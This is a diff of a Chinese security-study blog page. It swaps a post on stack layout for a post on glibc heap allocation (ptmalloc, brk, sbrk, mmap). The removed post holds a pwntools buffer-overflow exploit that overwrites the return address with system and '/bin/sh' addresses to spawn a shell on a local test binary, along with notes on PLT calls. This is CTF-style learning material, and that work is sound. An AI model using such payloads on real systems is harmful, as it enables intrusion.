@@ -19,24 +19,24 @@
   <meta name="author" content="luyanpei">
   <meta name="keywords" content="">
   
-    <meta name="description" content="12345678910111213141516from pwn import *context.log_level&#x3D;&#x27;debug&#x27;p&#x3D;process(&#x27;.&#x2F;test2&#x27;)system_addr&#x3D;0x0804845Cbin_sh_addr&#x3D;0x0804A024system_plt_addr&#x3D;0x08048320payload&#x3D;(0x88+0x4)*b&amp;#x27">
+    <meta name="description" content="glibc堆管理机制Memory ALLcator常见的内存管理机制： ​	dlmalloc：通用分配器 ​	ptmalloc：glibc分配器，继承自dlmalloc，并提供了多线程支持，主要研究对象 ​	jemalloc：Firefox ​	tcmalloc：Chrome ​	其他：编程语言内存分配及回收，比如python malloc工作机制第一次调用malloc 如果调用分配大小大于128">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于布置栈的见解">
-<meta property="og:url" content="http://example.com/2024/10/15/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/index.html">
+<meta property="og:title" content="glibc堆管理机制">
+<meta property="og:url" content="http://example.com/2024/10/15/glibc%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/index.html">
 <meta property="og:site_name" content="Hello~ lpp">
-<meta property="og:description" content="12345678910111213141516from pwn import *context.log_level&#x3D;&#x27;debug&#x27;p&#x3D;process(&#x27;.&#x2F;test2&#x27;)system_addr&#x3D;0x0804845Cbin_sh_addr&#x3D;0x0804A024system_plt_addr&#x3D;0x08048320payload&#x3D;(0x88+0x4)*b&amp;#x27">
+<meta property="og:description" content="glibc堆管理机制Memory ALLcator常见的内存管理机制： ​	dlmalloc：通用分配器 ​	ptmalloc：glibc分配器，继承自dlmalloc，并提供了多线程支持，主要研究对象 ​	jemalloc：Firefox ​	tcmalloc：Chrome ​	其他：编程语言内存分配及回收，比如python malloc工作机制第一次调用malloc 如果调用分配大小大于128">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-10-15T04:00:00.000Z">
-<meta property="article:modified_time" content="2024-10-16T12:40:27.028Z">
+<meta property="article:modified_time" content="2024-10-15T09:53:07.729Z">
 <meta property="article:author" content="luyanpei">
-<meta property="article:tag" content="stack">
+<meta property="article:tag" content="glibc">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>关于布置栈的见解 - Hello~ lpp</title>
+  <title>glibc堆管理机制 - Hello~ lpp</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +213,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="关于布置栈的见解"></span>
+            <span id="subtitle" data-typed-text="glibc堆管理机制"></span>
           
         </div>
 
@@ -236,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          246 字
+          266 字
         
       </span>
     
@@ -293,12 +293,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">关于布置栈的见解</h1>
+            <h1 id="seo-header">glibc堆管理机制</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年10月16日 晚上
+                    本文最后更新于 2024年10月15日 下午
                   
                 
               </p>
@@ -306,12 +306,28 @@
             
               <div class="markdown-body">
                 
-                <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./test2&#x27;</span>)<br><br>system_addr=<span class="hljs-number">0x0804845C</span><br>bin_sh_addr=<span class="hljs-number">0x0804A024</span><br>system_plt_addr=<span class="hljs-number">0x08048320</span><br>payload=(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)*<span class="hljs-string">b&#x27;a&#x27;</span>+p32(system_addr)+p32(bin_sh_addr)<br><span class="hljs-comment">#payload1=(0x88+0x4)*&#x27;a&#x27;+p32(system_plt_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br><span class="hljs-comment">#error_payload=(0x88+0x4)*&#x27;a&#x27;+p32(system_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br>gdb.attach(p)<br><span class="hljs-comment">#print payload</span><br><span class="hljs-comment">#print payload1</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-<p>调用函数plt地址，需要有返回地址一般加“bbbb”这类无效地址，后面加参数。</p>
-<p>调用程序代码段的函数直接跟参数就行。</p>
-<p>汇编语言中的call指令相当于：push call指令的下一条指令，jmp call指令单步步入的地址。</p>
-<p>总而言之如果调用的是代码段里的函数后面直接跟该函数参数就可以，如果是调用的plt段的函数需要提供一个虚假返回地址后面再跟该函数的参数，上文的error_payload是将两者杂糅了，调用了代码段的函数并且提供了虚假的返回地址，导致system函数的参数是’bbbb’，而不是binsh_addr.</p>
+                <h2 id="glibc堆管理机制"><a href="#glibc堆管理机制" class="headerlink" title="glibc堆管理机制"></a>glibc堆管理机制</h2><h3 id="Memory-ALLcator"><a href="#Memory-ALLcator" class="headerlink" title="Memory ALLcator"></a>Memory ALLcator</h3><p>常见的内存管理机制：</p>
+<p>​	dlmalloc：通用分配器</p>
+<p>​	ptmalloc：glibc分配器，继承自dlmalloc，并提供了多线程支持，主要研究对象</p>
+<p>​	jemalloc：Firefox</p>
+<p>​	tcmalloc：Chrome</p>
+<p>​	其他：编程语言内存分配及回收，比如python</p>
+<h3 id="malloc工作机制"><a href="#malloc工作机制" class="headerlink" title="malloc工作机制"></a>malloc工作机制</h3><p>第一次调用malloc</p>
+<p>如果调用分配大小大于128kb，会去调用mmap函数，交由内核函数sys_mmap处理</p>
+<p>如果调用分配大小小于128kb，会去调用brk()函数，交由内核函数sys_brk处理</p>
+<h3 id="内存分配机制"><a href="#内存分配机制" class="headerlink" title="内存分配机制"></a>内存分配机制</h3><p>头文件：#include&lt;unistd.h&gt;</p>
+<p>​	brk()：</p>
+<p>​	函数原型：int brk (void*end_data_segment)</p>
+<p>​	功能和作用：用于设置program_break指向的位置</p>
+<p>​	sbrk()</p>
+<p>​	函数原型：void* sbrk(intptr_t increment)</p>
+<p>​	功能和作用：同brk()，参数可以是负数。执行成功返回上一次program_break的值，可以设置参数为0返回当</p>
+<p>前的program_break.</p>
+<p>​	mmap()</p>
+<p>​	功能和作用：当用户申请空间大于等于128kb，也就是0x20000字节时，不再使用brk()进行分配，改为使用</p>
+<p>mmap()。</p>
+<p>​	unmmap()</p>
+<p>​	功能和作用：堆mmap()申请的空间进行回收。</p>
 
                 
               </div>
@@ -345,7 +361,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/stack/" class="print-no-link">#stack</a>
+        <a href="/tags/glibc/" class="print-no-link">#glibc</a>
       
     </div>
   
@@ -357,8 +373,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>关于布置栈的见解</div>
-      <div>http://example.com/2024/10/15/关于布置栈的见解/</div>
+      <div>glibc堆管理机制</div>
+      <div>http://example.com/2024/10/15/glibc堆管理机制/</div>
     </div>
     <div class="license-meta">
       
@@ -402,9 +418,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/15/mprotect%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%A0%88%E7%9A%84%E6%9D%83%E9%99%90/" title="mprotect函数可以修改内存栈的权限">
+                      <a href="/2024/10/15/SROP/" title="SROP（利用signal机制）">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">mprotect函数可以修改内存栈的权限</span>
+                        <span class="hidden-mobile">SROP（利用signal机制）</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -412,8 +428,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/15/%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/" title="基本调试方法">
-                        <span class="hidden-mobile">基本调试方法</span>
+                      <a href="/2024/10/15/ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/" title="ROP-ret2__libc_csu_init（64位ELF）">
+                        <span class="hidden-mobile">ROP-ret2__libc_csu_init（64位ELF）</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
